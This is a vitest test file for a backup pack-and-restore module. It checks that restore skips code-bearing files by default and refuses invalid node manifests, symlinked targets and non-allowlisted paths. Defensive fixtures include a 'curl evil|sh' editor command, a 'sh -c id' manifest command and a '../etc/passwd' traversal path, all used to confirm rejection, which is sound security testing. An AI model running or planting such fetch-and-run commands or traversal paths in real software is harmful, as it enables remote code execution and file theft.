import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  BACKUP_SCHEMA,
  packBackup,
  parseBackupBundle,
  restoreBackup,
} from "../src/routes/backup.js";

let dir: string;
beforeAll(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "threadle-backup-"));
});
afterAll(() => {
  fs.rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
});

describe("threadle/backup@1", () => {
  it("round-trips graphs, settings, and folders through pack/restore", async () => {
    const root = path.join(dir, "src");
    fs.mkdirSync(path.join(root, "graphs"), { recursive: true });
    fs.mkdirSync(path.join(root, "payloads"), { recursive: true });
    fs.mkdirSync(path.join(root, "nodes"), { recursive: true });
    fs.writeFileSync(
      path.join(root, "graphs", "g1.json"),
      JSON.stringify({ id: "g1", name: "Demo" }),
    );
    fs.writeFileSync(path.join(root, "settings.json"), JSON.stringify({ theme: "mono" }));
    fs.writeFileSync(
      path.join(root, "workflow-folders.json"),
      JSON.stringify({ folders: [], placements: {} }),
    );
    fs.writeFileSync(path.join(root, "payloads", "abc.json"), JSON.stringify({ content: "hi" }));
    fs.writeFileSync(
      path.join(root, "nodes", "echo.json"),
      JSON.stringify({ id: "echo", bin: "echo" }),
    );
    // versions should be skipped
    fs.mkdirSync(path.join(root, "graphs", "versions", "g1"), { recursive: true });
    fs.writeFileSync(
      path.join(root, "graphs", "versions", "g1", "old.json"),
      JSON.stringify({ id: "g1", name: "old" }),
    );

    const bundle = await packBackup(root);
    expect(bundle.$schema).toBe(BACKUP_SCHEMA);
    expect(bundle.files.map((f) => f.path).sort()).toEqual([
      "graphs/g1.json",
      "nodes/echo.json",
      "payloads/abc.json",
      "settings.json",
      "workflow-folders.json",
    ]);

    // Default restore: code-bearing categories (nodes, settings.json) are
    // skipped unless explicitly opted into.
    const dest = path.join(dir, "dest");
    fs.mkdirSync(dest, { recursive: true });
    const parsed = parseBackupBundle(JSON.parse(JSON.stringify(bundle)));
    const { written, skipped } = await restoreBackup(parsed, dest);
    expect(written).toBe(3);
    expect(skipped).toEqual(["nodes", "settings.json"]);
    expect(JSON.parse(fs.readFileSync(path.join(dest, "graphs", "g1.json"), "utf8"))).toEqual({
      id: "g1",
      name: "Demo",
    });
    expect(fs.existsSync(path.join(dest, "settings.json"))).toBe(false);
    expect(fs.existsSync(path.join(dest, "nodes", "echo.json"))).toBe(false);

    // Explicit opt-in restores everything, and settings.json is re-normalized
    // through the settings validator rather than written verbatim.
    const dest2 = path.join(dir, "dest2");
    fs.mkdirSync(dest2, { recursive: true });
    const full = await restoreBackup(parsed, dest2, [
      "graphs",
      "payloads",
      "nodes",
      "settings.json",
      "workflow-folders.json",
    ]);
    expect(full.written).toBe(5);
    expect(full.skipped).toEqual([]);
    const restoredSettings = JSON.parse(
      fs.readFileSync(path.join(dest2, "settings.json"), "utf8"),
    );
    expect(restoredSettings.theme).toBeUndefined(); // unknown keys dropped
    expect(restoredSettings.editor).toEqual({ mode: "vscode" });
    expect(fs.existsSync(path.join(dest2, "nodes", "echo.json"))).toBe(true);
  });

  it("refuses restore of an invalid node manifest", async () => {
    const bundle = parseBackupBundle({
      $schema: BACKUP_SCHEMA,
      exportedAt: "2026-01-01T00:00:00.000Z",
      files: [
        {
          path: "nodes/evil/node.json",
          encoding: "utf8",
          // entry+command together is rejected by validateCustomNodeManifest
          content: JSON.stringify({ id: "evil", entry: "x.ts", command: ["sh", "-c", "id"] }),
        },
      ],
    });
    const dest = path.join(dir, "dest-invalid-node");
    fs.mkdirSync(dest, { recursive: true });
    await expect(restoreBackup(bundle, dest, ["nodes"])).rejects.toThrow(/refusing restore/);
  });

  it("drops a non-allowlisted editor command from restored settings", async () => {
    const bundle = parseBackupBundle({
      $schema: BACKUP_SCHEMA,
      exportedAt: "2026-01-01T00:00:00.000Z",
      files: [
        {
          path: "settings.json",
          encoding: "utf8",
          content: JSON.stringify({
            editor: { mode: "command", command: "sh -c 'curl evil|sh'" },
          }),
        },
      ],
    });
    const dest = path.join(dir, "dest-editor");
    fs.mkdirSync(dest, { recursive: true });
    await restoreBackup(bundle, dest, ["settings.json"]);
    const restored = JSON.parse(fs.readFileSync(path.join(dest, "settings.json"), "utf8"));
    expect(restored.editor.command).toBeUndefined();
    expect(restored.editor.mode).toBe("command");
  });

  it("refuses to write through a symlinked target", async () => {
    const dest = path.join(dir, "dest-symlink");
    fs.mkdirSync(dest, { recursive: true });
    const outside = path.join(dir, "outside.json");
    fs.writeFileSync(outside, "{}");
    fs.symlinkSync(outside, path.join(dest, "workflow-folders.json"));
    const bundle = parseBackupBundle({
      $schema: BACKUP_SCHEMA,
      exportedAt: "2026-01-01T00:00:00.000Z",
      files: [
        { path: "workflow-folders.json", encoding: "utf8", content: "{}" },
      ],
    });
    await expect(
      restoreBackup(bundle, dest, ["workflow-folders.json"]),
    ).rejects.toThrow(/symlink/);
  });

  it("rejects paths outside the allowlist", () => {
    expect(() =>
      parseBackupBundle({
        $schema: BACKUP_SCHEMA,
        exportedAt: "2026-01-01T00:00:00.000Z",
        files: [{ path: "../etc/passwd", encoding: "utf8", content: "x" }],
      }),
    ).toThrow(/invalid backup path|allowlist/);
  });
});
